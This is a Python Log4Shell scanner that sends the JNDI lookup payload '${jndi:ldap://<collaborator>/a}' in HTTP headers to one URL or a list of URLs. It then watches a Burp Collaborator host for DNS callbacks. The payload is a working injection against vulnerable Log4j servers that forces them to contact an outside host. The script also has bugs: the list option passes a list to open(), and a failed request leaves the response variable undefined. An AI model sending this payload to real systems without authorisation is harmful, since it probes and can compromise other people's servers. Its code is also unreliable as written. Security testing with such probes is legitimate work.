import requests
import argparse


if __name__ == "__main__":

    aparser = argparse.ArgumentParser(description='Log4Shell', usage="\npython3 log4shell.py -u url\npython3 log4shell.py -U urlList")
    aparser.add_argument("-u", "--url", type=str, help="url to scan", required=False)
    aparser.add_argument("-U", "--urlList",type=str, nargs='+', help="List of Urls to check", required=False)
    aparser.add_argument("-c","--colab", type=str, help="Burp Collaborator", required=True)
    args = aparser.parse_args()

    if args.url == None and args.urlList == None:
        print("You need to specify an url or file containing a list of urls")
        print("\npython3 log4shell.py -u url\npython3 log4shell.py -U urlList")
        exit()

    if args.urlList != None:
        hosts = open(args.urlList, 'r')
        for host in hosts:
            print("Testing: " + host + " can take a bit of time")
            header = {"X-Api-Version": "${jndi:ldap://" + args.colab + "/a}", "User-Agent":"${jndi:ldap://" + args.colab + "/a}"}

            try:
                r = requests.get(host.strip(), headers=header)
            except:
                pass
            if 'Server' in r.headers:
                if 'IIS' in r.headers['Server']:
                    print(host.strip() + ' appears to be running IIS, should be fine - though feel free to double check collaborator')
            
            print("request header sent for " + host.strip() + " check burp collaborator for DNS requests")
    else:
        print("Testing: " + args.url + " can take a bit of time")
        header = {"X-Api-Version": "${jndi:ldap://" + args.colab + "/a}"}
        
        try:
            r = requests.get(args.url, headers=header)
        except:
            pass
        
        if 'Server' in r.headers:
            if 'IIS' in r.headers['Server']:
                print(args.url + ' appears to be running IIS, should be fine - though feel free to double check collaborator')
            
        print("request header sent for " + args.url + " check burp collaborator for DNS requests")
